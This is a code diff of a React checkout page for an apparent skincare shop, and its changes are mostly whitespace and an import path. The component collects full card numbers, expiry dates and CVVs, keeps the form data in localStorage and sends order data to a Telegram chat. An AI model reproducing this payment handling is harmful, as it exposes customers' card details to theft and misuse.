@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { sendToTelegram } from '../services/telegramService';
+import { sendToTelegram } from '../services/TelegramService';
 
 const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
   const [step, setStep] = useState(1);
@@ -38,7 +38,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
     if (savedData) {
       setFormData(JSON.parse(savedData));
     }
-    
+
     // Generate initial order ID
     setOrderId(`ORD-${Date.now()}-${Math.floor(Math.random() * 1000)}`);
   }, []);
@@ -58,14 +58,14 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
       [name]: value
     };
     setFormData(newData);
-    
+
     // Save to localStorage
     localStorage.setItem('customerData', JSON.stringify(newData));
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    
+
     if (step < 3) {
       if (step === 1) {
         // Validate shipping info
@@ -74,7 +74,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
           return;
         }
       }
-      
+
       if (step === 2) {
         // Validate payment info
         if (!formData.cardNumber || !formData.cardName || !formData.expiryDate || !formData.cvv) {
@@ -82,13 +82,13 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
           return;
         }
       }
-      
+
       // Scroll to top before changing step
       window.scrollTo({
         top: 0,
         behavior: 'smooth'
       });
-      
+
       // Small delay to ensure scroll completes
       setTimeout(() => {
         setStep(step + 1);
@@ -96,12 +96,12 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
     } else {
       // Final order placement
       setIsSubmitting(true);
-      
+
       try {
         // Generate new order ID
         const finalOrderId = `ORD-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
         setOrderId(finalOrderId);
-        
+
         // Prepare order data for Telegram
         const orderData = {
           orderId: finalOrderId,
@@ -138,24 +138,24 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
 
         // Send to Telegram
         const telegramResponse = await sendToTelegram(orderData, 'order_placed');
-        
+
         if (telegramResponse) {
           setOrderPlaced(true);
-          
+
           // Clear cart data from localStorage
           localStorage.removeItem('cartItems');
           localStorage.removeItem('customerData');
-          
+
           // Scroll to top to show success message
           window.scrollTo({
             top: 0,
             behavior: 'smooth'
           });
-          
+
           // Show success message
           setTimeout(() => {
             setIsSubmitting(false);
-            
+
             // Redirect to home after 3 seconds
             setTimeout(() => {
               navigateTo('home');
@@ -177,7 +177,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
     const visaPattern = /^4[0-9]{12}(?:[0-9]{3})?$/;
     const mastercardPattern = /^5[1-5][0-9]{14}$/;
     const amexPattern = /^3[47][0-9]{13}$/;
-    
+
     if (visaPattern.test(cardNumber)) return 'Visa';
     if (mastercardPattern.test(cardNumber)) return 'Mastercard';
     if (amexPattern.test(cardNumber)) return 'American Express';
@@ -190,11 +190,11 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
     const matches = v.match(/\d{4,16}/g);
     const match = matches && matches[0] || '';
     const parts = [];
-    
+
     for (let i = 0, len = match.length; i < len; i += 4) {
       parts.push(match.substring(i, i + 4));
     }
-    
+
     if (parts.length) {
       return parts.join(' ');
     } else {
@@ -239,7 +239,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
       top: 0,
       behavior: 'smooth'
     });
-    
+
     setTimeout(() => {
       setStep(step - 1);
     }, 100);
@@ -432,7 +432,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
         return (
           <div>
             <h3 className="text-xl font-semibold text-dark mb-6">Order Review</h3>
-            
+
             {/* Order Confirmation */}
             {orderPlaced ? (
               <div className="bg-green-50 border border-green-200 rounded-lg p-8 text-center mb-6">
@@ -463,7 +463,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
                     </div>
                   </div>
                 </div>
-                
+
                 <div className="bg-primary rounded-lg p-6 mb-6">
                   <h4 className="font-semibold text-dark mb-4">Order Summary</h4>
                   {cartItems.map((item) => (
@@ -497,7 +497,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
                     </div>
                   </div>
                 </div>
-                
+
                 <div className="mb-6">
                   <h4 className="font-semibold text-dark mb-2">Shipping Address</h4>
                   <p className="text-dark">
@@ -508,7 +508,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
                     {formData.phone || 'Phone: Not provided'}
                   </p>
                 </div>
-                
+
                 <div className="mb-6">
                   <h4 className="font-semibold text-dark mb-2">Payment Method</h4>
                   <p className="text-dark">
@@ -517,7 +517,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
                     Expires: {formData.expiryDate}
                   </p>
                 </div>
-                
+
                 <div className="mb-6">
                   <label className="block text-dark font-medium mb-2">Special Instructions (Optional)</label>
                   <textarea
@@ -529,13 +529,13 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
                     placeholder="Any special delivery instructions or notes..."
                   />
                 </div>
-                
+
                 <div className="flex items-start mb-6">
-                  <input 
-                    type="checkbox" 
-                    id="terms" 
-                    className="mt-1 mr-3" 
-                    required 
+                  <input
+                    type="checkbox"
+                    id="terms"
+                    className="mt-1 mr-3"
+                    required
                   />
                   <label htmlFor="terms" className="text-dark text-sm">
                     I agree to the Terms of Service and Privacy Policy. I understand that my order details will be sent to the skincare team via Telegram for processing. I authorize the charge to my payment method.
@@ -556,7 +556,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
       <div className="container mx-auto px-4">
         <h1 className="text-3xl font-bold text-dark mb-2">Checkout</h1>
         <p className="text-dark mb-8">Complete your purchase in 3 simple steps</p>
-        
+
         {/* Progress Steps */}
         <div className="mb-12">
           <div className="flex items-center justify-between max-w-2xl mx-auto">
@@ -575,13 +575,13 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
             ))}
           </div>
         </div>
-        
+
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
           {/* Checkout Form */}
           <div className="lg:col-span-2">
             <form onSubmit={handleSubmit} className="bg-white rounded-xl shadow-md p-8">
               {renderStep()}
-              
+
               {/* Navigation Buttons */}
               {!orderPlaced && (
                 <div className="flex justify-between mt-8 pt-8 border-t">
@@ -595,7 +595,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
                       Back
                     </button>
                   )}
-                  
+
                   <button
                     type="submit"
                     className={`ml-auto px-8 py-3 rounded-lg font-semibold transition duration-300 flex items-center ${isSubmitting ? 'bg-gray-400 cursor-not-allowed' : 'bg-accent text-white hover:bg-opacity-90'}`}
@@ -624,20 +624,20 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
               )}
             </form>
           </div>
-          
+
           {/* Order Summary Sidebar */}
           <div className="lg:col-span-1">
             <div className="bg-white rounded-xl shadow-md p-6 sticky top-24">
               <h3 className="text-xl font-bold text-dark mb-6">Your Order</h3>
-              
+
               {/* Order Items */}
               <div className="mb-6 max-h-64 overflow-y-auto">
                 {cartItems.map((item) => (
                   <div key={item.id} className="flex items-center mb-4 pb-4 border-b">
                     <div className="w-16 h-16 bg-primary rounded-lg overflow-hidden flex items-center justify-center mr-4">
                       {item.image ? (
-                        <img 
-                          src={item.image} 
+                        <img
+                          src={item.image}
                           alt={item.name}
                           className="w-full h-full object-cover"
                           onError={(e) => {
@@ -659,7 +659,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
                   </div>
                 ))}
               </div>
-              
+
               {/* Order Totals */}
               <div className="space-y-3">
                 <div className="flex justify-between">
@@ -683,7 +683,7 @@ const Checkout = ({ cartItems, cartTotal, navigateTo }) => {
                   </div>
                 </div>
               </div>
-              
+
               {/* Telegram Info */}
               <div className="mt-8 pt-6 border-t">
                 <div className="flex items-center text-sm text-dark mb-2">
